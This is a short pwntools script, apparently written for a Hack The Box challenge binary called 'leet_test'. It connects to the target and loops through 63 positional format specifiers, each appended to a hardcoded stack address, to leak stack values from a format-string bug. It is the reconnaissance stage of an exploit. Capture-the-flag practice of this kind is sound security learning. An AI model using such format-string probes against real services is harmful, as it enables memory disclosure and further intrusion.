#!/usr/bin/env python3

from pwn import *

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

exe = context.binary = ELF("./leet_test", checksec=False)
context.log_level = "warning"

rand_addr = p64(0x7fffffffdb1c)

for i in range(1, 64):
    io = start()

    payload = rand_addr + f"%{i}$p".encode()
    io.sendlineafter(b"Welcome to HTB!\nPlease enter your name: ", payload)
    leak = io.recv()
    print(i, ":", leak)


    io.close()
